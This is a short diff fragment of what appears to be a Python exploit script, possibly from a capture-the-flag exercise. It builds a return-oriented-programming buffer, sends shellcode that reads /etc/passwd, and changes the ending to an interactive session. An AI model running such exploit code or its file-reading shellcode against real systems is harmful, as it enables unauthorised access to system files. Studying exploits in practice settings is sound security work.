@@ -22,5 +22,4 @@ buf += rop.fill(100, buf)
 
 p.write(buf)
 p.write(sc.cat('/etc/passwd'))
-print p.read(8192)
-p.wait()
+p.interact()
